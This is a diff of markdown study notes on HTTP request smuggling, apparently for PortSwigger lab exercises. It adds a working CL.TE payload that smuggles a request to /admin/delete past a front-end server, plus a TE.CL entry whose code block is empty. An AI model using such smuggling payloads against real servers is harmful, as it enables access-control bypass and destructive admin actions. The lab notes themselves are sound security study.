@@ -3971,11 +3971,11 @@ Response: Communication timed out. (chunked size is 5)
 - Bypass front-end security controls
   - Exploit discrepancies between front-end and back-end servers to bypass security checks.
     ```
-   Content-Length: 13
-   Transfer-Encoding: chunked
+    Content-Length: 13
+    Transfer-Encoding: chunked
 
-   0\r\n\r\n
-   ```
+    0\r\n\r\n
+    ```
 - Revealing front-end request rewriting
   - Identify how the front-end server rewrites requests by sending conflicting headers.
     ```
@@ -4150,8 +4150,30 @@ Response: Communication timed out. (chunked size is 5)
     0\r\n
     \r\n
     ```
-- dd
-- dd
+- Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+  - Info: This lab involves a front-end and back-end server, and the **front-end server doesn't support chunked encoding**. There's an admin panel at /admin, but the front-end server blocks access to it. To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
+  - https://www.youtube.com/watch?v=L6GikFq4Xbc
+    ```
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 139
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /admin/delete?username=carlos HTTP/1.1
+    Host: localhost
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 10
+
+    x=
+    ```
+- Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+  - Info: This lab involves a front-end and back-end server, and the **back-end server doesn't support chunked encoding**. There's an admin panel at /admin, but the front-end server blocks access to it. To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
+  - https://www.youtube.com/watch?v=XvqAbDo5DI0
+    ```
+    ```
 - dd
 - dd
 - dd 
